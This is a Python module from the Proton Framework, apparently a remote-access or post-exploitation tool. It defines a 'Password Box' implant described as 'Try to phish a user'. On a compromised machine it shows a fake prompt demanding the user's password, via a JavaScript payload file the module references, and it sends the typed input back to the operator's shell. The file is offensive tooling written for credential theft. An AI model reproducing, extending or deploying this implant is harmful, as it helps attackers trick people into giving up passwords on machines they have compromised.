#!/usr/bin/env python3

#            ---------------------------------------------------
#                             Proton Framework              
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.job
import core.implant
import uuid

class PasswordBoxJob(core.job.Job):
    def done(self):
        self.results = self.data
        self.display()

    def display(self):
        self.shell.print_plain("Input contents:")
        self.shell.print_plain(self.data)

class PasswordBoxImplant(core.implant.Implant):

    NAME = "Password Box"
    DESCRIPTION = "Try to phish a user."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/phish/password_box"

    def load(self):
        self.options.register("Message", "You must enter your password to continue...", "Displayed to user.")

    def job(self):
        return PasswordBoxJob

    def run(self):
        payloads = {}
        payloads["js"] = "data/implant/phish/password_box.js"
        self.dispatch(payloads, self.job)
